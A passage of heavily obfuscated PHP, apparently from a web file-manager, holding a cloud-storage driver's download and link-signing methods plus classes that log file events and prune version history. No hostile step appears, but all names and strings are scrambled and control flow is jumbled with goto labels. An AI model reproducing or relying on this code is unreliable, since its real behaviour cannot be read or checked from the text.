¤‰ø­³Ğ: $eø–š…“ä– = array($AÍÔÏ³™„×[1316] => $this->bucket, $AÍÔÏ³™„×[1317] => $b«ˆ¼Â¿ß±, $AÍÔÏ³™„×[1318] => time() + $AÄÎ‹ÈŞ¸î, $AÍÔÏ³™„×[1319] => $Bà²‚Ç —); if ($F’¬‡¼âØº) { $eø–š…“ä–[$AÍÔÏ³™„×[1230]] = $F’¬‡¼âØº; } $FÈŞÆœñˆ = base64_encode(json_encode($eø–š…“ä–)); goto CÍôâø²“¥; AóÍÜİëÛ¨: } public function download($d•¼Òí¥ğ, $A¨î‰Ë¶ÉÓ) { goto EÒ•¨Ï±ÆÇ; a©ÒÁç½šì: fclose($Fì•… ÔÛƒ); return $A¨î‰Ë¶ÉÓ; goto AØëÌŠ®¼; b™†ëÓêª: $E–óÍÖ¯Œë = 1024 * 200; $Fì•… ÔÛƒ = fopen($F™‚“î‹ô, $_SERVER[úÎü][1270]); while (!0) { $d‘èã–ğë = $this->fileSubstr($d•¼Òí¥ğ, $bªÆóÑºÑ, $E–óÍÖ¯Œë); if ($d‘èã–ğë === !1) { return !1; } fwrite($Fì•… ÔÛƒ, $d‘èã–ğë); $bªÆóÑºÑ += $E–óÍÖ¯Œë; if (strlen($d‘èã–ğë) < $E–óÍÖ¯Œë) { break; } } goto a©ÒÁç½šì; EÒ•¨Ï±ÆÇ: $F™‚“î‹ô = IO::getPathInner(IO::mkfile($A¨î‰Ë¶ÉÓ)); if (!($cœ¾·ã›Ğš = $this->link($d•¼Òí¥ğ))) { return !1; } $bªÆóÑºÑ = 0; goto b™†ëÓêª; AØëÌŠ®¼: } public function link($eŠà´ÕØôš, $có¤‡èŠ¤‡ = array()) { $f©ãŠ‡‹ä› =& $_SERVER[úÎü]; $eŠà´ÕØôš = trim($eŠà´ÕØôš, $f©ãŠ‡‹ä›[8]); if (!empty($this->token)) { $E¼´¡ˆÊ = strtotime(date($f©ãŠ‡‹ä›[1321])); $dñŠÃÆå = substr(md5($this->token . $f©ãŠ‡‹ä›[278] . $E¼´¡ˆÊ . $f©ãŠ‡‹ä›[1322] . $eŠà´ÕØôš), 12, 8) . $E¼´¡ˆÊ; $có¤‡èŠ¤‡[] = $f©ãŠ‡‹ä›[1323] . $dñŠÃÆå; } $FŸóÃ…óÔ = !empty($có¤‡èŠ¤‡) ? $f©ãŠ‡‹ä›[69] . implode($f©ãŠ‡‹ä›[278], $có¤‡èŠ¤‡) : $f©ãŠ‡‹ä›[33]; return $this->getHost() . $f©ãŠ‡‹ä›[8] . $eŠà´ÕØôš . $FŸóÃ…óÔ; } public function fileOut($aÌ ×‡ƒ†Í, $cº÷—Øƒ = false, $cóÒšô“›Õ = false, $EĞ­ô¥ÖŠé = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($aÌ ×‡ƒ†Í, $cº÷—Øƒ, $cóÒšô“›Õ, $EĞ­ô¥ÖŠé); } if (!$cóÒšô“›Õ) { $cóÒšô“›Õ = $this->pathThis($aÌ ×‡ƒ†Í); } $c¦âï‘Ğ = $cº÷—Øƒ ? array($_SERVER[úÎü][1324] . rawurlencode($cóÒšô“›Õ)) : array(); $a¢î¡´±Š§ = $this->link($aÌ ×‡ƒ†Í, $c¦âï‘Ğ); $this->fileOutLink($a¢î¡´±Š§); } public function fileOutServer($d‹‚÷Õ“£†, $AÃŠ©ºŠŒÖ = false, $F‘ÀÁ²ˆÓ¡ = false, $bİµ£Ú­ñ¯ = '') { parent::fileOut($d‹‚÷Õ“£†, $AÃŠ©ºŠŒÖ, $F‘ÀÁ²ˆÓ¡, $bİµ£Ú­ñ¯); } public function fileOutImage($dÃ†‚²‹Ç, $aâØÒÕ»ºÌ = 250) { $côùğ•ˆš„ = $this->link($dÃ†‚²‹Ç . $_SERVER[úÎü][1325] . $aâØÒÕ»ºÌ); $this->fileOutLink($côùğ•ˆš„); } public function fileOutImageServer($B„ÌšêÙé’, $B½ôôèàŠ  = 250) { parent::fileOutImage($B„ÌšêÙé’, $B½ôôèàŠ ); } public function hashMd5($e³š—ö”ì°) { $AÜÕçë¶÷× =& $_SERVER[úÎü]; $B™¸Áœ®Ì = $this->_objectMeta($e³š—ö”ì°); return isset($B™¸Áœ®Ì[$AÜÕçë¶÷×[204]]) ? $B™¸Áœ®Ì[$AÜÕçë¶÷×[204]] : !1; } public function size($C›ÆàîÚŸ˜) { $AñÎ½•Á–‚ = $this->objectMeta($C›ÆàîÚŸ˜); return $AñÎ½•Á–‚ ? $AñÎ½•Á–‚[$_SERVER[úÎü][77]] : 0; } public function info($cÈŒÂ²…¨Ú) { if ($this->isFolder($cÈŒÂ²…¨Ú)) { return $this->folderInfo($cÈŒÂ²…¨Ú); } else { if ($this->isFile($cÈŒÂ²…¨Ú)) { return $this->fileInfo($cÈŒÂ²…¨Ú); } } return !1; } public function exist($aÏ÷¤µ°™Ü) { return $this->isFile($aÏ÷¤µ°™Ü) || $this->isFolder($aÏ÷¤µ°™Ü); } public function isFile($C®ìĞê’âœ) { return !$this->isFolder($C®ìĞê’âœ) && $this->objectMeta($C®ìĞê’âœ); } public function isFolder($A•ÍÀŸì‰‹) { return $this->cacheMethod($_SERVER[úÎü][195], $A•ÍÀŸì‰‹); } protected function objectMeta($Bì–Á²â÷Ò) { return $this->cacheMethod($_SERVER[úÎü][196], $Bì–Á²â÷Ò); } protected function _objectMeta($CÂôù²ò) { goto d–ÏÌ«Ûè; f‘ÉÅôÜ: if (!$BÛ¾ĞÈéÃ²[$a×òˆã˜î[1046]]) { return null; } $A”±¡õˆÖ‘ = isset($BÛ¾ĞÈéÃ²[$a×òˆã˜î[1048]]) ? $BÛ¾ĞÈéÃ²[$a×òˆã˜î[1048]] : array(); if (!isset($A”±¡õˆÖ‘[$a×òˆã˜î[1327]])) { return null; } goto BÕ×ŠŒÌ; d–ÏÌ«Ûè: $a×òˆã˜î =& $_SERVER[úÎü]; if ($CÂôù²ò == $a×òˆã˜î[33] || $CÂôù²ò == $a×òˆã˜î[8]) { return array(); } $BÛ¾ĞÈéÃ² = $this->ussRequest($CÂôù²ò, $a×òˆã˜î[1326]); goto f‘ÉÅôÜ; BÕ×ŠŒÌ: $BÉ¶ÍæãŠê = array($a×òˆã˜î[29] => isset($A”±¡õˆÖ‘[$a×òˆã˜î[1327]]) ? $A”±¡õˆÖ‘[$a×òˆã˜î[1327]] : null, $a×òˆã˜î[77] => isset($A”±¡õˆÖ‘[$a×òˆã˜î[1328]]) ? $A”±¡õˆÖ‘[$a×òˆã˜î[1328]] : null, $a×òˆã˜î[204] => isset($A”±¡õˆÖ‘[$a×òˆã˜î[1329]]) ? $A”±¡õˆÖ‘[$a×òˆã˜î[1329]] : null, $a×òˆã˜î[1296] => isset($A”±¡õˆÖ‘[$a×òˆã˜î[1330]]) ? $A”±¡õˆÖ‘[$a×òˆã˜î[1330]] : null); $BÉ¶ÍæãŠê[$a×òˆã˜î[1297]] = isset($A”±¡õˆÖ‘[$a×òˆã˜î[1331]]) ? strtotime($A”±¡õˆÖ‘[$a×òˆã˜î[1331]]) : $BÉ¶ÍæãŠê[$a×òˆã˜î[1296]]; return $BÉ¶ÍæãŠê; goto b„‹øïÃĞÏ; b„‹øïÃĞÏ: } protected function _isFolder($cïº™ÔòÄ) { $b”ÁÁ¡†Ã’ =& $_SERVER[úÎü]; if ($cïº™ÔòÄ == $b”ÁÁ¡†Ã’[33] || $cïº™ÔòÄ == $b”ÁÁ¡†Ã’[8]) { return !0; } $A‰œ™ÂÑ¤ = $this->_objectMeta($cïº™ÔòÄ); return isset($A‰œ™ÂÑ¤[$b”ÁÁ¡†Ã’[29]]) && $A‰œ™ÂÑ¤[$b”ÁÁ¡†Ã’[29]] == $b”ÁÁ¡†Ã’[76] ? !0 : !1; } } goto F§Õ±ĞÄÆ; FÓÍ›ä÷óˆ: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\162\x63\x65\x5f\x65\x76\145\156\164"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\x54\151\155\x65", "\x74\151\155\145", "\151\156\163\145\162\x74", "\x66\x75\156\143\164\x69\157\156"), array("\x64\145\x73\x63", '', "\x69\156\x73\x65\162\x74\x2c\165\160\144\141\x74\145\54\163\145\x6c\145\143\x74", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($CèŸ‚éïÀ, $DçŞ²‰¥•Ö, $C¬îÏÙµÂˆ = '') { goto Fø®óŞ™Š; EŞÅ¸’Ó÷—: $bšËÕŠÕÔì = array($e¹®ê¤×Ô„[399] => $CèŸ‚éïÀ, $e¹®ê¤×Ô„[1853] => $dùÄ¶ËÄÑÏ[$e¹®ê¤×Ô„[478]], $e¹®ê¤×Ô„[1854] => $dùÄ¶ËÄÑÏ[$e¹®ê¤×Ô„[28]], $e¹®ê¤×Ô„[483] => $dùÄ¶ËÄÑÏ[$e¹®ê¤×Ô„[483]], $e¹®ê¤×Ô„[1477] => USER_ID, $e¹®ê¤×Ô„[404] => $DçŞ²‰¥•Ö, $e¹®ê¤×Ô„[1479] => $C¬îÏÙµÂˆ); $this->addSystemLog($DçŞ²‰¥•Ö, $bšËÕŠÕÔì); return $this->add($bšËÕŠÕÔì); goto AœäÙÉ—Ëê; Fø®óŞ™Š: $e¹®ê¤×Ô„ =& $_SERVER[úÎü]; if (!$this->eventSave) { return; } $dùÄ¶ËÄÑÏ = Model($e¹®ê¤×Ô„[1162])->sourceInfo($CèŸ‚éïÀ); goto e£ˆËÚ²’ğ; e£ˆËÚ²’ğ: if (!$dùÄ¶ËÄÑÏ) { return !1; } if ($this->isCacheEvent($dùÄ¶ËÄÑÏ, $DçŞ²‰¥•Ö)) { return; } if ($C¬îÏÙµÂˆ && is_string($C¬îÏÙµÂˆ)) { $C¬îÏÙµÂˆ = array($e¹®ê¤×Ô„[1678] => $C¬îÏÙµÂˆ); } goto EŞÅ¸’Ó÷—; AœäÙÉ—Ëê: } private function addSystemLog($fèíÇ±¢ÁÄ, $fÓÙ•Ş±÷½) { $DÑÚ¦°¥É° =& $_SERVER[úÎü]; if ($fèíÇ±¢ÁÄ == $DÑÚ¦°¥É°[1855]) { $fèíÇ±¢ÁÄ = $fÓÙ•Ş±÷½[$DÑÚ¦°¥É°[421]][$DÑÚ¦°¥É°[1856]]; } else { if (in_array($fèíÇ±¢ÁÄ, array($DÑÚ¦°¥É°[1621], $DÑÚ¦°¥É°[1857]))) { $fèíÇ±¢ÁÄ = $fÓÙ•Ş±÷½[$DÑÚ¦°¥É°[421]][$DÑÚ¦°¥É°[693]]; } } $e‘«ƒ÷èİó = array_merge($fÓÙ•Ş±÷½, array($DÑÚ¦°¥É°[1858] => $fÓÙ•Ş±÷½[$DÑÚ¦°¥É°[385]], $DÑÚ¦°¥É°[1859] => $fÓÙ•Ş±÷½[$DÑÚ¦°¥É°[1859]])); Model($DÑÚ¦°¥É°[1584])->addLog($DÑÚ¦°¥É°[1860] . $fèíÇ±¢ÁÄ, $e‘«ƒ÷èİó); } private function isCacheEvent($FˆçŸ«‹Ë, $e‚Ö˜‰¸ñ²) { if ($FˆçŸ«‹Ë[$_SERVER[úÎü][387]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($eŞë ºéø, $BÁá‰‹¡£Ã) { $Cƒá‹­´êª =& $_SERVER[úÎü]; $AàÆğøòˆĞ = Model($Cƒá‹­´êª[1162])->sourceInfo($eŞë ºéø); $EÏ›ª‡‰ô = array($Cƒá‹­´êª[1856] => $BÁá‰‹¡£Ã, $Cƒá‹­´êª[28] => $AàÆğøòˆĞ[$Cƒá‹­´êª[28]]); return $this->addEvent($eŞë ºéø, $Cƒá‹­´êª[1855], $EÏ›ª‡‰ô); } public function eventFileEdit($eÊÌ†±‘‡Ó) { $C«Æ²É›†§ =& $_SERVER[úÎü]; $Bìáä¸×ê¨ = array($C«Æ²É›†§[1861] => $_SERVER[$C«Æ²É›†§[1862]], $C«Æ²É›†§[1863] => strtolower(ACTION)); return $this->addEvent($eÊÌ†±‘‡Ó, $C«Æ²É›†§[1611], $Bìáä¸×ê¨); } public function eventRecycle($B¿Ñã¿¯Øê, $E·ñ¨“à£) { return $this->addEvent($B¿Ñã¿¯Øê, $_SERVER[úÎü][1857], $E·ñ¨“à£); } public function eventRemove($c½Œ½õéø¹) { $eì²Ë­ŒÂ‘ =& $_SERVER[úÎü]; $C‡ÎìáéÎ = Model($eì²Ë­ŒÂ‘[1162])->sourceInfo($c½Œ½õéø¹); $AŞ‘–Ï«¹Ú = $C‡ÎìáéÎ[$eì²Ë­ŒÂ‘[28]]; return $this->addEvent($C‡ÎìáéÎ[$eì²Ë­ŒÂ‘[478]], $eì²Ë­ŒÂ‘[1610], $AŞ‘–Ï«¹Ú); } public function eventShare($eÎÕ½¾Ãé, $B¢›ÔœÓ˜Ô) { return $this->addEvent($eÎÕ½¾Ãé, $_SERVER[úÎü][1621], $B¢›ÔœÓ˜Ô); } public function eventMove($F”¬ÃÅæ, $Dõôº®Ğ¾Ü, $A´Ò†°ß’) { goto B¦§Ò“ê¶; f±ŒÛ«–äİ: $this->addEvent($Dõôº®Ğ¾Ü, $dÏŠØœÛ×[1867], $E…÷î“‹ÎÒ); goto e—Â¶¡Êõ; b…ÁİßÈğ²: $fÑæò¥„Ó‘ = $cõ×£¢õß->sourceInfo($Dõôº®Ğ¾Ü); $f”œ‡£Ù× = $cõ×£¢õß->sourceInfo($A´Ò†°ß’); $E…÷î“‹ÎÒ = array($dÏŠØœÛ×[1015] => $Dõôº®Ğ¾Ü, $dÏŠØœÛ×[1864] => $fÑæò¥„Ó‘[$dÏŠØœÛ×[28]], $dÏŠØœÛ×[1845] => $fÑæò¥„Ó‘[$dÏŠØœÛ×[483]], $dÏŠØœÛ×[1016] => $A´Ò†°ß’, $dÏŠØœÛ×[1865] => $f”œ‡£Ù×[$dÏŠØœÛ×[28]], $dÏŠØœÛ×[1866] => $f”œ‡£Ù×[$dÏŠØœÛ×[483]]); goto CáŒ¥¡ìæ·; B¦§Ò“ê¶: $dÏŠØœÛ× =& $_SERVER[úÎü]; $cõ×£¢õß = Model($dÏŠØœÛ×[1162]); $FğÀ¬»äšÖ = $cõ×£¢õß->sourceInfo($F”¬ÃÅæ); goto b…ÁİßÈğ²; CáŒ¥¡ìæ·: $this->addEvent($F”¬ÃÅæ, $dÏŠØœÛ×[509], $E…÷î“‹ÎÒ); $FğÀ¬»äšÖ = $cõ×£¢õß->sourceInfo($F”¬ÃÅæ); $E…÷î“‹ÎÒ = array($dÏŠØœÛ×[385] => $FğÀ¬»äšÖ[$dÏŠØœÛ×[385]], $dÏŠØœÛ×[28] => $FğÀ¬»äšÖ[$dÏŠØœÛ×[28]]); goto f±ŒÛ«–äİ; e—Â¶¡Êõ: } public function eventCopy($B¶“‰òÑº‚) { $this->eventCreate($B¶“‰òÑº‚, $_SERVER[úÎü][507]); } public function eventRename($CÒë¸ÉÊ©é, $b©Ë¯Ùˆ§Ü, $E‡äì˜×É) { $eêˆËéàÇ =& $_SERVER[úÎü]; $D¶Øøƒ¨¨ = array($eêˆËéàÇ[1015] => $b©Ë¯Ùˆ§Ü, $eêˆËéàÇ[1016] => $E‡äì˜×É); return $this->addEvent($CÒë¸ÉÊ©é, $eêˆËéàÇ[1175], $D¶Øøƒ¨¨); } public function eventAddComment($FŠçœçˆÄ, $c‰˜Øï††‰) { return $this->addEvent($FŠçœçˆÄ, $_SERVER[úÎü][1868], $c‰˜Øï††‰); } public function eventAddDesc($F£¥óµùÁ, $D¢‡Æ¡Ê×£) { return $this->addEvent($F£¥óµùÁ, $_SERVER[úÎü][1869], $D¢‡Æ¡Ê×£); } public function listBySource($f¦Ù’¬›‚±) { goto AÇòáæŞ×; d¤±¢‡¢éÑ: if ($c¹—‰âåÓª[$CÛáÒ³–ŒŸ[386]] == $CÛáÒ³–ŒŸ[83]) { $FîÇšñ©µ½ = Model($CÛáÒ³–ŒŸ[1162])->listSearchChildren($f¦Ù’¬›‚±, 20000); $FîÇšñ©µ½[] = $f¦Ù’¬›‚± . $CÛáÒ³–ŒŸ[368]; $d×­Ğõá¿½ = array($CÛáÒ³–ŒŸ[385] => array($CÛáÒ³–ŒŸ[7], $FîÇšñ©µ½)); } $AµÆ…¸ïº„ = $this->where($d×­Ğõá¿½)->order($CÛáÒ³–ŒŸ[1870])->selectPage(); if ($AµÆ…¸ïº„[$CÛáÒ³–ŒŸ[358]][$CÛáÒ³–ŒŸ[359]] == 0) { $AµÆ…¸ïº„[$CÛáÒ³–ŒŸ[358]][$CÛáÒ³–ŒŸ[359]] = 1; $AµÆ…¸ïº„[$CÛáÒ³–ŒŸ[361]] = array(array($CÛáÒ³–ŒŸ[399] => $f¦Ù’¬›‚±, $CÛáÒ³–ŒŸ[1853] => $c¹—‰âåÓª[$CÛáÒ³–ŒŸ[478]], $CÛáÒ³–ŒŸ[1477] => $c¹—‰âåÓª[$CÛáÒ³–ŒŸ[394]], $CÛáÒ³–ŒŸ[404] => $CÛáÒ³–ŒŸ[1871], $CÛáÒ³–ŒŸ[405] => $c¹—‰âåÓª[$CÛáÒ³–ŒŸ[190]], $CÛáÒ³–ŒŸ[1479] => $CÛáÒ³–ŒŸ[33])); } goto b¯ÅÖ††; b¯ÅÖ††: return $this->eventListParse($AµÆ…¸ïº„, $f¦Ù’¬›‚±); goto cÔê°›µé; AÇòáæŞ×: $CÛáÒ³–ŒŸ =& $_SERVER[úÎü]; $c¹—‰âåÓª = Model($CÛáÒ³–ŒŸ[1162])->sourceInfo($f¦Ù’¬›‚±); $d×­Ğõá¿½ = array($CÛáÒ³–ŒŸ[399] => $f¦Ù’¬›‚±); goto d¤±¢‡¢éÑ; cÔê°›µé: } private function eventListParse($D‚«Æå˜ôŒ, $Eòš‡Õ‚Ñ) { goto D¤½‹É³¾“; dÑÖĞø¹Æ: $a™œ¹ˆ„‡ = array_to_keyvalue($B¨÷Ñí²ˆ­, $F¥ìÇ–Ä¨Ù[33], $F¥ìÇ–Ä¨Ù[1859]); foreach ($B¨÷Ñí²ˆ­ as $b¶­Ü”¦ê´) { $eâ¾Şå²ç = $b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[421]]; if ($b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[29]] == $F¥ìÇ–Ä¨Ù[509] && isset($eâ¾Şå²ç[$F¥ìÇ–Ä¨Ù[1015]])) { $f¼ÇÂ²®œ»[] = $eâ¾Şå²ç[$F¥ìÇ–Ä¨Ù[1015]] . $F¥ìÇ–Ä¨Ù[33]; $f¼ÇÂ²®œ»[] = $eâ¾Şå²ç[$F¥ìÇ–Ä¨Ù[1016]] . $F¥ìÇ–Ä¨Ù[33]; } if ($b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[29]] == $F¥ìÇ–Ä¨Ù[1867] && isset($eâ¾Şå²ç[$F¥ìÇ–Ä¨Ù[385]])) { $f¼ÇÂ²®œ»[] = $eâ¾Şå²ç[$F¥ìÇ–Ä¨Ù[385]] . $F¥ìÇ–Ä¨Ù[33]; } } $f¼ÇÂ²®œ» = array_merge($f¼ÇÂ²®œ», $a™œ¹ˆ„‡, array($Eòš‡Õ‚Ñ . $F¥ìÇ–Ä¨Ù[33])); goto dÆ·ŞÊÜÁµ; dÆ·ŞÊÜÁµ: $f¼ÇÂ²®œ» = array_unique($f¼ÇÂ²®œ»); $e¸¡ùÊ‚¤Š = array_unique(array_to_keyvalue($B¨÷Ñí²ˆ­, $F¥ìÇ–Ä¨Ù[33], $F¥ìÇ–Ä¨Ù[1485])); $bíŒ…ãÏ‡Ù = Model($F¥ìÇ–Ä¨Ù[494])->userListInfo($e¸¡ùÊ‚¤Š); goto BÃ¡ø™¢ª˜; D¤½‹É³¾“: $F¥ìÇ–Ä¨Ù =& $_SERVER[úÎü]; $B¨÷Ñí²ˆ­ = $D‚«Æå˜ôŒ[$F¥ìÇ–Ä¨Ù[361]]; $f¼ÇÂ²®œ» = array_to_keyvalue($B¨÷Ñí²ˆ­, $F¥ìÇ–Ä¨Ù[33], $F¥ìÇ–Ä¨Ù[385]); goto dÑÖĞø¹Æ; BÃ¡ø™¢ª˜: $a«Ö™½‘ä» = Model($F¥ìÇ–Ä¨Ù[752])->sourceListInfo($f¼ÇÂ²®œ», !0); foreach ($B¨÷Ñí²ˆ­ as &$b¶­Ü”¦ê´) { if ($b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[29]] == $F¥ìÇ–Ä¨Ù[509] && isset($b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[421]][$F¥ìÇ–Ä¨Ù[1015]])) { $b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[421]][$F¥ìÇ–Ä¨Ù[1015]] = $a«Ö™½‘ä»[$b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[421]][$F¥ìÇ–Ä¨Ù[1015]]]; $b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[421]][$F¥ìÇ–Ä¨Ù[1016]] = $a«Ö™½‘ä»[$b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[421]][$F¥ìÇ–Ä¨Ù[1016]]]; } if ($b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[29]] == $F¥ìÇ–Ä¨Ù[1867] && isset($b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[421]][$F¥ìÇ–Ä¨Ù[385]])) { $b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[421]][$F¥ìÇ–Ä¨Ù[385]] = $a«Ö™½‘ä»[$b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[421]][$F¥ìÇ–Ä¨Ù[385]]]; } $b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[407]] = $a«Ö™½‘ä»[$b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[385]]]; $b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[1872]] = $a«Ö™½‘ä»[$b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[1859]]]; if ($b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[29]] == $F¥ìÇ–Ä¨Ù[1610]) { $b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[1872]] = $b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[407]]; $b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[1859]] = $b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[1872]][$F¥ìÇ–Ä¨Ù[385]]; $b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[407]] = !1; $b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[385]] = $F¥ìÇ–Ä¨Ù[33]; } $b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[1802]] = $bíŒ…ãÏ‡Ù[$b¶­Ü”¦ê´[$F¥ìÇ–Ä¨Ù[1485]]]; } unset($b¶­Ü”¦ê´); goto aŒ¨ÅË‡; aŒ¨ÅË‡: $D‚«Æå˜ôŒ[$F¥ìÇ–Ä¨Ù[361]] = $B¨÷Ñí²ˆ­; return $D‚«Æå˜ôŒ; goto a°§ÊÑåÂ¶; a°§ÊÑåÂ¶: } public function removeBySource($c¶ÄÖ²íŸé) { $fÖí”ìïˆ® = array($_SERVER[úÎü][399] => $c¶ÄÖ²íŸé); $this->where($fÖí”ìïˆ®)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\162\x63\145\x5f\150\151\x73\x74\x6f\162\171"; public function historyCount($EŞõĞ‡§ÎÑ) { goto AÚÑñ«šÒõ; AÚÑñ«šÒõ: $BÃ´â‰ÑÙï =& $_SERVER[úÎü]; if (!$EŞõĞ‡§ÎÑ) { return array(); } if (is_string($EŞõĞ‡§ÎÑ) || is_int($EŞõĞ‡§ÎÑ)) { $EŞõĞ‡§ÎÑ = array($EŞõĞ‡§ÎÑ); } goto B—ˆŠõ³Î; B—ˆŠõ³Î: $eÇ‡±è¦ÔÓ = $BÃ´â‰ÑÙï[1873]; $b³¬Ñõäæ = array($BÃ´â‰ÑÙï[385] => array($BÃ´â‰ÑÙï[7], $EŞõĞ‡§ÎÑ)); $f°Âù»ß = $this->field($eÇ‡±è¦ÔÓ)->where($b³¬Ñõäæ)->group($BÃ´â‰ÑÙï[385])->select(); goto cÍ‚êïÎ İ; cÍ‚êïÎ İ: return array_to_keyvalue($f°Âù»ß, $BÃ´â‰ÑÙï[385], $BÃ´â‰ÑÙï[1677]); goto a±½…’´ôÀ; a±½…’´ôÀ: } public function addHistory($bÜ·ÖÖõÊ, $A¹ŒĞÖÆ‰É = '') { $A ì—î’ =& $_SERVER[úÎü]; $D±¸á™Æ = array($A ì—î’[399] => $bÜ·ÖÖõÊ[$A ì—î’[385]], $A ì—î’[1477] => isset($bÜ·ÖÖõÊ[$A ì—î’[395]]) ? $bÜ·ÖÖõÊ[$A ì—î’[395]] : $bÜ·ÖÖõÊ[$A ì—î’[394]], $A ì—î’[436] => $bÜ·ÖÖõÊ[$A ì—î’[435]], $A ì—î’[537] => $bÜ·ÖÖõÊ[$A ì—î’[77]], $A ì—î’[1874] => $A¹ŒĞÖÆ‰É); $CË’‚¬ñ×À = $GLOBALS[$A ì—î’[6]][$A ì—î’[84]][$A ì—î’[1063]]; if ($CË’‚¬ñ×À > 1) { $this->historyAutoClear($D±¸á™Æ[$A ì—î’[385]]); $this->add($D±¸á™Æ); } Hook::trigger($A ì—î’[1875], $D±¸á™Æ); Model($A ì—î’[1876])->eventFileEdit($bÜ·ÖÖõÊ[$A ì—î’[385]]); } private function historyAutoClear($f£ï÷Üïˆ†) { goto E®¦²«õ¿; E®¦²«õ¿: $Dğ¶Ú«òÁ =& $_SERVER[úÎü]; $Aéé…ÔãÀ = Model($Dğ¶Ú«òÁ[1083])->get($Dğ¶Ú«òÁ[1084]); $F„ï¢ÒÄ“ß = $GLOBALS[$Dğ¶Ú«òÁ[6]][$Dğ¶Ú«òÁ[84]][$Dğ¶Ú«òÁ[1063]]; goto D˜ÓãÂëã; D˜ÓãÂëã: $cÆ¼Š’µÙİ = $Aéé…ÔãÀ == $Dğ¶Ú«òÁ[1085] ? 5 : $F„ï¢ÒÄ“ß; if ($F„ï¢ÒÄ“ß <= 1) { $cÆ¼Š’µÙİ = 1; } if ($cÆ¼Š’µÙİ >= 500) { return; } goto E˜íØìÂÚ; b•†…ÁâîÊ: $this->where($C™÷ªÖ–)->delete(); Model($Dğ¶Ú«òÁ[438])->remove($B‹¸òº½¦); goto EŸ¢Ï÷¿ë; f†ÊŞ„´Ë: $d²Ë®é‰áŸ = array_to_keyvalue($aäìœ¯´É, $Dğ¶Ú«òÁ[33], $Dğ¶Ú«òÁ[383]); $d²Ë®é‰áŸ = array_slice($d²Ë®é‰áŸ, $cÆ¼Š’µÙİ); $B‹¸òº½¦ = array_to_keyvalue($aäìœ¯´É, $Dğ¶Ú«òÁ[33], $Dğ¶Ú«òÁ[435]); goto F­ÃĞš…ã; F­ÃĞš…ã: $B‹¸òº½¦ = array_slice($B‹¸òº½¦, $cÆ¼Š’µÙİ); if (!$d²Ë®é‰áŸ || !$B‹¸òº½¦) { return; } $C™÷ªÖ– = array($Dğ¶Ú«òÁ[401] => array($Dğ¶Ú«òÁ[7], $d²Ë®é‰áŸ)); goto b•†…ÁâîÊ; E˜íØìÂÚ: $C™÷ªÖ– = array($Dğ¶Ú«òÁ[399] => $f£ï÷Üïˆ†); $aäìœ¯´É = $this->field($Dğ¶Ú«òÁ[1877])->where($C™÷ªÖ–)->order($Dğ¶Ú«òÁ[1870])->select(); if (!$aäìœ¯´É || $cÆ¼Š’µÙİ >= count($aäìœ¯´É)) { return; } goto f†ÊŞ„´Ë; EŸ¢Ï÷¿ë: } public function listData($D‘ßÎèÙÆò) { goto eö¬³æ½; f½İÚŒ¯¢: $b¹¼ùä«—¾ = $this->field($b‰ğŠƒ•ƒ½)->where($bô¨Œ‚Œ)->order($Aƒ­¥éÛÒÛ[1870])->selectPage(); $this->_listAppendUser($b¹¼ùä«—¾[$Aƒ­¥éÛÒÛ[361]]); $Cˆ‚Å…êØ§ = Model($Aƒ­¥éÛÒÛ[1083])->get($Aƒ­¥éÛÒÛ[1084]); goto bŠÙƒªÑÒƒ; eö¬³æ½: $Aƒ­¥éÛÒÛ =& $_SERVER[úÎü]; $bô¨Œ‚Œ = array($Aƒ­¥éÛÒÛ[399] => $D‘ßÎèÙÆò); $b‰ğŠƒ•ƒ½ = $Aƒ­¥éÛÒÛ[1878]; goto f½İÚŒ¯¢; bŠÙƒªÑÒƒ: $fÛ¬÷×‡Ü¹ = 3; if ($Cˆ‚Å…êØ§ == $Aƒ­¥éÛÒÛ[1085]) { $b¹¼ùä«—¾[$Aƒ­¥éÛÒÛ[361]] = array_slice($b¹¼ùä«—¾[$Aƒ­¥éÛÒÛ[361]], 0, $fÛ¬÷×‡Ü¹); $b¹¼ùä«—¾[$Aƒ­¥éÛÒÛ[358]] = array($Aƒ­¥éÛÒÛ[1879] => 1, $Aƒ­¥éÛÒÛ[1880] => 20, $Aƒ­¥éÛÒÛ[1881] => 1, $Aƒ­¥éÛÒÛ[1882] => count($b¹¼ùä«—¾[$Aƒ­¥éÛÒÛ[361]])); } return $b¹¼ùä«—¾; goto FÜËåÛêÒê; FÜËåÛêÒê: } protected function _listAppendUser(&$e…¢ùÚ˜ä) { $a’Ü¼©„¢Ã =& $_SERVER[úÎü]; $Eã„õŞñ»Ê = array_to_keyvalue($e…¢ùÚ˜ä, $a’Ü¼©„¢Ã[33], $a’Ü¼©„¢Ã[1485]); 